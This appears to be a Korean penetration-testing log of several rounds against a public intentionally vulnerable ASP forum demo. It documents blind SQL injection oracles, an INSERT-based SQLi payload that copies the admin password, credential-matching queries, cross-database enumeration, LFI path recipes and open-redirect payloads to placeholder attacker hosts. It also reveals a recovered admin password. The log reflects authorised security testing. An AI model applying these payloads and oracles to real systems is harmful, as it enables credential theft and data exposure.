권한  : IS_SRVROLEMEMBER('sysadmin')=FALSE / ('serveradmin')=FALSE / ('securityadmin')=FALSE
        IS_MEMBER('db_owner')=FALSE / HAS_PERMS_BY_NAME(...,'CONTROL SERVER'|'ALTER SETTINGS')=FALSE
        sysadmin 로그인 수=1 (이 로그인 아님)
설정  : xp_cmdshell=0, show advanced options=0, Ole Automation=0, clr enabled=0,
        Ad Hoc Distributed Queries=0, Agent XPs=0   (전부 value_in_use=0)
프로시저: OBJECT_ID('sys.xp_cmdshell') 은 존재하지만 EXECUTE 권한=FALSE
실행  : 스택드 쿼리 미실행(Round 5) → sp_configure 를 호출할 수단 자체가 없음
```
⇒ **이 SQLi 의 영향 상한은 데이터 유출**이다. SQL Server 를 경유한 OS 명령 실행은 불가.

### ★ 18. 환경 / 측면 확장

```
@@VERSION  = Microsoft SQL Server 2014 (SP3-GDR) (KB5029184) - 12.0.6179.…
Edition    = Express Edition (64-bit)        ProductVersion = 12.0.6179.1
주체        = DB acuforum, SYSTEM_USER=SUSER_SNAME()=USER_NAME()=acunetix
HAS_DBACCESS: master T / tempdb T / model F / msdb T / acublog T / acuforum T / acuservice T
DB(7)      : master, tempdb, model, msdb, acublog, acuforum, acuservice
acublog    : comments, news, users          ← 다른 애플리케이션의 자격증명 테이블
acuservice : users                         ← 동일
```
`sys.sql_logins`·`sys.configurations`(69행) 조회 가능, 연결된 서버 1개.

### ★ 19. `acuforum.users` 스키마와 자격증명

```
컬럼(5): uname, upass, email, realname, avatar
행 수 변동: 1,000 초과 → 131 → 645 (수 분 간격) — 공개 데모 DB 가 외부에서 계속 쓰이는 중
uname='admin' 실존. upass = 길이 4 / 숫자·특수문자 없음 / 전체 알파벳 → 평문이며 블라인드 추출로
문자 단위 복원 가능(약 28요청). 값은 정본에 기록하지 않는다.
```
자격증명 일치 오라클(재사용 가능):
```sql
(SELECT COUNT(*) FROM users WHERE uname='<u>' AND upass='<평문후보>')>0
(SELECT COUNT(*) FROM users WHERE uname='<u>' AND
   UPPER(upass)=CONVERT(varchar(32),HASHBYTES('MD5','<후보>'),2))>0
(SELECT COUNT(*) FROM users WHERE uname='<u>' AND
   UPPER(upass)=CONVERT(varchar(40),HASHBYTES('SHA1','<후보>'),2))>0
```
→ 평문·MD5·SHA1 어느 저장방식이든 '로그인 없이' 자격증명을 검증할 수 있다.

### ★ 20. 이 오라클의 사용법 (자동화 자산)

`scratch/round8/probe_db_facts*.py` 에 임의 스칼라식 추출기가 있다:
- `oracle(cond)` — boolean 판정 (TRUE=게시글 렌더 / FALSE=0행 / None=500 구문오류)
- `exact_int(expr, lo, hi)` — 정수·행수 이분탐색. **상한이 실제값보다 작으면 상한값이 그대로
  반환되는 함정** → 큰 값이 나오면 상한을 올려 재측정할 것.
- `extract(expr, n)` — ASCII 이분탐색 문자 추출(문자당 7요청). 대량 추출 전에 요청 수를 계산하고
  백그라운드로 돌릴 것(1,000요청 ≈ 5분).
- `sql_variant` 반환값(`SERVERPROPERTY` 등)은 `CAST(... AS varchar(n))` 로 감싸야 추출된다.

---

## Round 9 검증 추가 (2026-09-23 09:55Z) — 교차 애플리케이션 실데이터 (승인 ①)

### ★ 21. `acuservice.dbo.users` — 결제카드 데이터 노출

```
테이블 1 / 뷰 0 / 프로시저 0
컬럼(8): id, username, password, name, joindate, ccnumber, ccverification, address
행 수 2,  username = 'blade', 'tibi'
password = 32자 hex (MD5)
```
포럼의 `search.asp` SQLi 하나로 **다른 애플리케이션의 카드번호(PAN)·CVV(`ccverification`)·주소
컬럼**에 도달한다. **카드 값은 추출하지 않았다**(정책) — 스키마·행수·컬럼명만으로 영향도가 입증된다.

### ★ 22. `acublog.dbo.users` — 별도 블로그 앱

```
테이블 3: comments, news, users / 뷰 0 / 프로시저 0
컬럼(3): uname, upass, alevel     ← alevel = 권한등급 필드
행 수 1,  uname='admin',  upass = 32자 hex (MD5)
```

### ★ 23. 앱별 비밀번호 저장 방식이 다르다

| DB | 테이블 | 비밀번호 저장 | 비고 |
|---|---|---|---|
| acuforum | users(uname/upass/email/realname/avatar) | **평문 4자** | Round 8 |
| acublog | users(uname/upass/alevel) | MD5 32자 hex | Round 9 |
| acuservice | users(username/password/…) | MD5 32자 hex | Round 9 |

→ 자격증명 오라클(평문 / `HASHBYTES('MD5')` / `HASHBYTES('SHA1')` 3중 대조)이 세 앱 모두에 그대로
적용된다.

### ★ 24. 교차 DB 열거 절차 (재사용)

1. `HAS_DBACCESS('<db>')=1` 로 접근 가능 DB 를 먼저 추린다(Round 8: master/tempdb/msdb/acublog/acuforum/acuservice).
2. 각 DB 의 `tables`/`views`/`procedures` 수를 읽어 규모를 파악.
3. `<db>.sys.tables` 를 이름 오름차순으로 순회해 테이블 이름을 전부 뽑는다.
4. `<db>.sys.columns`(object_id 를 `<db>.sys.tables` 서브쿼리로 얻음)로 컬럼 이름을 뽑는다.
   — 컬럼 *수* 를 먼저 이분탐색하면 몇 개를 뽑을지 정할 수 있다.
5. **민감 컬럼(카드·비밀번호)의 값은 뽑지 않는다.** 스키마·행수·컬럼명으로 영향도를 확정한다.
6. 값 추출은 문자당 7요청이므로, 꼭 필요한 식별자만 최소 개수로.

한계: SELECT 전용(스택드 쿼리 미실행, Round 5) → `alevel` 등 권한 필드 **상향/변조는 불가**.
이 SQLi 의 상한은 "인스턴스 전체 읽기 노출"로 고정된다.

---

## Round 10 검증 추가 (2026-09-23 10:25Z) — 백업/인스턴스 경로 + LFI 사슬 판정

### ★ 25. msdb 백업 이력 → 경로 유출

```
msdb.dbo.backupset = 6행 / backupmediafamily = 6행 / backupfile = 12행
MIN(physical_device_name) [LEN=94]:
  C:\Backup_testasp_testaspnet_1apr2021\Databases\Backup_from_Management_Studio\acublog_1apr2021
InstanceDefaultDataPath = C:\Program Files\Microsoft SQL Server\MSSQL12.SQL\MSSQL\DATA\
InstanceDefaultLogPath  = 동일        InstanceDefaultBackupPath = NULL
차단: sys.master_files=0행, sysjobs / backuphistory / dm_server_services / dm_os_sys_info 전부 500
```
→ 백업 디렉터리 구조·명명 규칙(`<db>_1apr2021`)·SQL 인스턴스명(`MSSQL12.SQL`) 노출.

### ★ 26. LFI + 경로 → **백업 파일 탈취는 불가** (사슬 닫힘)

`item = "../.." + (드라이브 제거 경로)` 로 임의 절대경로를 LFI 로 지정할 수 있으므로(웹루트 = `C:\`
아래 2단계) 그대로 검증했다. **23개 변형 전부 500(도달 0/23)**:
백업 파일 원문 + `.bak/.trn/.zip/.7z/.rar/.sql/.txt`, 타 DB 백업명 추정, 디렉터리 자체·상위,
`DATA\acuforum.mdf`·`acuforum_log.LDF`·`acublog.mdf`·`acuservice.mdf`.
대조군 `..%2F..%2FWindows%2Fwin.ini` → **200/2739** 이므로 음성 결과를 신뢰할 수 있다.
⇒ 앱풀 ID 가 SQL 설치/백업 디렉터리에는 접근하지 못한다. LFI 는 `C:\Windows`·`C:\inetpub\wwwroot`
쪽만 열려 있다.

### ★ 27. LFI 경로 검증 프로토콜 (반드시 지킬 것)

1. **대조군을 같은 요청 형식으로 함께 보낸다.** 실존이 확인된 파일(여기선 `C:\Windows\win.ini`)이
   200 이 아니면 결과 전체를 "미상"으로 폐기한다. 인코딩 실수는 "차단됨"과 구분되지 않는다.
   Round 10 에서 실제로 두 번(공백 미인코딩 → 0/160, 이중 인코딩 `%252f` → 전부 500) 속을 뻔했다.
2. **URL 은 한 번만 인코딩한다.** 실제 문자(`../..`)로 조립 → 마지막에 `quote(item, safe="")` 한 번.
   `%2f` 를 미리 넣으면 `%252f` 가 된다.
3. **잘린 값은 `LEN()` 먼저 → 꼬리만 이어 추출.** 문자당 7요청이라 꼬리 복원이 수백 요청을 아낀다.
4. 절대경로 → LFI 변환: 드라이브(`C:\`)를 떼고 `\`→`/` 로 바꾼 뒤 앞에 `../..` 를 붙인다.

---

## Round 12 검증 추가 (2026-09-23 11:30Z) — 신규 축 소진 결과

### ★ 28. `RetURL` 취약 패턴은 4개 파일에 복제 — 가장 약한 것은 Logout.asp

```
Login.asp     : Response.Redirect(Request.QueryString("RetURL"))        ← POST 성공 필요
Register.asp  : Response.Redirect("Login.asp?RetURL=" & Request.QueryString("RetURL"))  ← POST 성공 필요
Logout.asp    : Session.Contents.Remove("uname") 후 Redirect(Request.QueryString("RetURL"))
Templatize.asp: RetURL 을 curURL 로만 사용(링크 생성용, 리다이렉트 아님)
```
**★ `/Logout.asp?RetURL=` = 인증·POST 불필요한 단일 GET 오픈 리다이렉트(확정).**
```
GET /Logout.asp?RetURL=http%3A%2F%2Fexample.com%2F  → 302 Location: http://example.com/
GET /Logout.asp?RetURL=%2F%2Fevil.example%2Fp      → 302 Location: //evil.example/p
GET /Logout.asp?RetURL=https%3A%2F%2Fattacker.tld%2Fphish → 302 Location: https://attacker.tld/phish
GET /Logout.asp (대조군)                           → 302 Location: Default.asp
```
교훈: **한 파일에서 취약 패턴을 찾으면 같은 패턴을 다른 파일에서 먼저 재확인**한다. 조건이 가장
약한 인스턴스가 최적 PoC 다.

### ★ 29. `/_vti_cnf/` FrontPage 메타데이터 디렉터리 노출 (HTTP 200)

```
GET /_vti_cnf/Default.asp → 200 / 926B
  vti_extenderversion:SR|4.0.2.8912        ← FrontPage 확장 버전
  vti_timelastmodified:TR|05 Oct 2007      ← 개발 시점
  vti_filesize:IR|3663
  vti_cachedsvcrellinks:VX|FQUS|acuforum/styles.css  ← ★ 내부 가상경로명 'acuforum'
  vti_backlinkinfo:VX|acuforum/login.asp acuforum/register.asp acuforum/search.asp
                        acuforum/default.asp acuforum/showthread.asp acuforum/showforum.asp
                        acuforum/templatize.asp      ← 페이지 인벤토리 전체
GET /_vti_cnf/<file>  → 파일별 메타데이터(Search 926B, Login 772B, ShowThread 882B,
                        shownews 338B, Logout 338B) · 없는 파일은 404 ⇒ 존재 오라클
차단: /_vti_pvt/*(service.pwd·administrators.pwd·authors.pwd·users.pwd·service.cnf) 전부 404,
      /_vti_bin/*(shtml.dll·author.dll·admin.dll) 전부 404 ⇒ **FP 서버 확장 미설치**(메타데이터만 잔존)
      하위 디렉터리 _vti_cnf 및 디렉터리 리스팅 404/403
```
⇒ 자격증명 탈취로는 이어지지 않지만, **웹루트 파일 인벤토리 + 개발 이력 + 내부 가상경로**가
노출된다.

### ★ 30. Register.asp INSERT 경로 — 이스케이프 전무 (신규 주입 지점)

```vbscript
sql  = "INSERT INTO users (uname, upass, email, realname, avatar) VALUES ("
sql  = sql & "'" & Request.Form("tfUName") & "',"
sql  = sql & "'" & Request.Form("tfUPass") & "',"
sql  = sql & "'" & Request.Form("tfEmail") & "',"
sql  = sql & "'" & Request.Form("tfRName") & "',"
sql  = sql & "'')"
conn.Execute sql
```
4개 필드 전부 무처리. 같은 계열의 `ShowThread.asp`/`ShowForum.asp` 는
`Replace(tfSubject,"'","''")` 로 따옴표를 처리하므로 **의도적으로 남겨둔 주입 지점**으로 보인다.
- 기존 SQLi(`search.asp`)는 **SELECT(읽기 전용)** 경로 → 영향 상한 "데이터 유출".
- 이 경로는 **INSERT(쓰기)** 이고 세션·인증이 불필요 → 성공 시 영향 등급이 **무결성 훼손**으로
  올라간다. 검증은 상태 변경이므로 사용자 사전 승인 후 실행한다.

### ★ 31. 소스에서 절대경로를 얻는 방법 (재사용)

`Templatize.asp?item=logInput.asp` 소스에 `'WriteToFile "C:\scripts\logInput.txt", dataStr, True`
가 있었다 → 경로를 **추측하지 않고 소스에서 얻는다**. `C:\scripts\` 는 웹루트(`C:\` 2단계) 기준
`..%2f..%2fscripts%2f` 로 대응되지만, 실제 파일은 없었다(호출부가 주석 처리됨).

### 32. 이 트랙에서 소진된 축 (재시도 금지 목록)

| 축 | 결과 |
|---|---|
| `C:\scripts\` 로그·스크립트 11종 | 전부 500 (로그 미생성) |
| 업로드·파일매니저 23종(업로드 asp + TinyMCE mcpuk 플러그인) | 전부 500 → **편집기 경유 업로드 없음** |
| 숨은 ASP 스크립트 56종(admin·conn·config·setup·install·xmlrpc·api·soap·mail·news·user·poll…) | 전부 500 → 웹루트 ASP 는 11개가 전부 |
| `/_vti_pvt/*`·`/_vti_bin/*` | 전부 404 → FP 확장 미설치 |
| 디렉터리 리스팅(`/html/`·`/jscripts/`·`/images/`·`/avatars/`·`/Templates/`·`/aspnet_client/`) | 전부 403 |

---

## Round 13 검증 추가 (2026-09-23 12:05Z) — Register.asp INSERT SQLi 실증 + 데모 DB 리셋

### ★ 33. `/Register.asp` INSERT 기반 SQLi — **확정** (사용자 승인 후 실증)

```sql
-- 소스의 무이스케이프 결합 (Round 12 판독)
INSERT INTO users (uname, upass, email, realname, avatar) VALUES ('<tfUName>','<tfUPass>','<tfEmail>','<tfRName>','')
```
주입(값 5개를 맞추고 나머지를 `--` 로 주석):
```
POST /Register.asp
  tfUName = rt12x', 'p', 'e', 'r', (SELECT TOP 1 upass FROM users WHERE uname='admin'))--
  tfUPass=x  tfEmail=x  tfRName=x
→ INSERT ... VALUES ('rt12x','p','e','r',(SELECT TOP 1 upass FROM users WHERE uname='admin'))-- ', ...
```
검증(전부 **읽기 전용 오라클**):
```
(SELECT COUNT(*) FROM users WHERE uname='rt12x')>0                                              → TRUE  (행 삽입됨)
(SELECT avatar FROM users WHERE uname='rt12x')=(SELECT TOP 1 upass FROM users WHERE uname='admin') → TRUE ★ 서브쿼리 실행됨
(SELECT email FROM users WHERE uname='rt12x')='e'  /  (SELECT realname ...)='r'                  → TRUE  (주입 리터럴 반영)
(SELECT COUNT(*) FROM users WHERE uname='rt12x')=1                                               → TRUE
대조: 정상 등록 rt12ctrl 의 (SELECT avatar ...)=''                                                → TRUE  (정상값은 빈 avatar)
쓰기→읽기: (SELECT avatar FROM users WHERE uname='rt12x') 추출 → 'none' (관리자 upass 4자, LEN=4·LOWER 일치)
```
**영향 상한**: 스택드 쿼리 미실행(§ Round 5) ⇒ 단일 INSERT 문 내부 조작만 가능.
**users 테이블에 행 1건 삽입**이 한계이고 UPDATE/DELETE 불가.
⇒ 등급 "데이터 유출" → **"데이터 무결성 훼손(쓰기)"** 로 상승(삭제·변조는 아님).

### ★ 34. 이 사이트의 **데모 DB 는 주기적으로 리셋된다**

```
(SELECT COUNT(*) FROM posts   WHERE title   LIKE '%RT6-STORED-XSS-PROOF%')>0  → FALSE
(SELECT COUNT(*) FROM posts   WHERE message LIKE '%onerror%')>0               → FALSE
(SELECT COUNT(*) FROM posts   WHERE title   LIKE 'RT7-%')>0                   → FALSE
(SELECT COUNT(*) FROM threads WHERE title   LIKE 'RT7-%')>0                   → FALSE
현재: showthread.asp?id=0/1/2 → posttext 1/2/3건, posts ≤30, users >200  (원래 데모 상태)
```
Round 6 의 저장형 XSS 페이로드와 Round 7 의 테스트 스레드/게시글이 **서버에서 사라졌다**.
⇒ **쓰기 기반 PoC 의 증거는 서버에 영구히 남지 않는다.** 정본은 우리가 캡처한
`scratch/round*/out/` 의 응답·JSON·스크린샷이며, 재현 시 게시글·행을 **다시 만들어야** 한다.
취약점 자체는 유효하다(같은 요청 → 같은 결과). 사라진 것은 증거 데이터다.
보고서의 재현 절차에 이 사실을 명시할 것.

### ★ 35. 쓰기 검증 방법론 (재사용)

1. 상태 변경이 필요한 검증은 **실행 전 승인**(5필드) → 승인 후 최소 횟수만 쓴다.
2. 성공 판정은 **응답 코드가 아니라 행의 내용**으로 한다 — 200 만으로는 INSERT 실행 여부를 알 수 없다.
3. **대조군을 먼저 세운다**: 정상 등록의 `avatar=''` 를 확립해야 주입 행의 비어있지 않은 avatar 가
   증거로서 의미를 갖는다(없으면 "원래 그런 값"과 구분 불가).
4. 쓰기→읽기 체인으로 값을 회수해 왕복을 증명한다(`avatar` 에 서브쿼리 결과를 넣고 다시 추출).
5. 되돌릴 수 없는 쓰기는 승인 요청에 그 사실을 명시한다(여기선 DELETE 권한 없음).

---

## Round 14 검증 추가 (2026-09-23 12:40Z) — 재현성 최종 점검 + 변동값 제거

### ★ 36. 헤드라인 PoC 재현성 (같은 시점 일괄 재실행, 읽기 전용 51요청)

```
LFI db.asp               200 / 2,908B · 자격증명 포함           ✅
LFI win.ini              200 / 2,739B                            ✅ (초기 라운드와 동일 크기)
LFI web.config           200 / 3,138B                            ✅
LFI unattend.xml         200 / 7,052B                            ✅
search.asp (1=1)         200 · 다수 행(실측 114)                 ✅
search.asp (1=2)         200 · 0행                              ✅
SYSTEM_USER='acunetix'   TRUE                                   ✅
showforum.asp  id 0·1·2  AND 1=1 → 200 / AND 1=2 → 500           ✅
showthread.asp id 0·1·2·3 AND 1=1 → 200 / AND 1=2 → 500          ✅
/Logout.asp?RetURL=      302 → 외부 URL                          ✅
/_vti_cnf/Default.asp    200 / 926B · vti_extenderversion 4.0.2.8912 ✅
저장형 XSS 페이로드      서버측 소실(리셋) → 게시글 재작성 필요      ⚠
```

### ★ 37. 오픈 리다이렉트 4곳 정확 분류 (Location 실측)

| 위치 | 선행 조건 | 리다이렉트 대상 | 판정 |
|---|---|---|---|
| **`/Logout.asp`** | **없음(무인증·단일 GET)** | `RetURL` 그대로 | ★ 대표 PoC |
| `/Login.asp` | 로그인 POST 성공 | `RetURL` 그대로 | 취약 |
| `/Register.asp` | 회원가입 POST 성공 | `Login.asp?RetURL=<값>` (동일 호스트 전달) | 취약(2단계) |
| `/Templatize.asp` | — | 없음(링크 생성 전용, `Server.URLEncode`) | 해당 없음 |

Logout 우회 변형 6종 전부 통과: `http://example.com/`, `//evil.example/p`,
`https://attacker.tld/phish`, `https:example.com`, `%09//evil.example`, `/%5Cevil.example`.
대조군(파라미터 없음) → `Default.asp`.

### ★ 38. 변동값 주의 (PoC 하드코딩 금지)

```
search.asp TRUE 응답 행수 : 초기 라운드 21 → 현재 114  (리셋·외부 사용으로 변동)
현존 스레드 id            : 0~7   (Round 7 에서 만든 id=9 는 리셋으로 소멸)
현존 포럼 id              : 0/1/2
판정 규칙                 : 절대값이 아니라 "FALSE(0행)와 구분되는가" 로만 판정한다
```
id 는 `showforum.asp?id=N` 응답의 `showthread.asp?id=NN` 링크에서 매번 새로 뽑는다.

### ★ 39. 도구 함정 — 자동 리다이렉트 추적

`urllib`(그리고 `curl -L`)은 302 를 **자동 추적**한다. 그대로 쓰면
`Logout.asp?RetURL=http://example.com/` 이 200 으로 보여 **"리다이렉트 없음"으로 오판**한다.
리다이렉트 취약점 검증에서는 `HTTPRedirectHandler.redirect_request` 가 None 을 반환하는
opener(또는 `curl` 기본값 = `-L` 없이)로 원 302 + `Location` 을 관측해야 한다.
Round 10 의 이중 인코딩과 같은 계열 — **라이브러리 기본 동작을 의심할 것**.

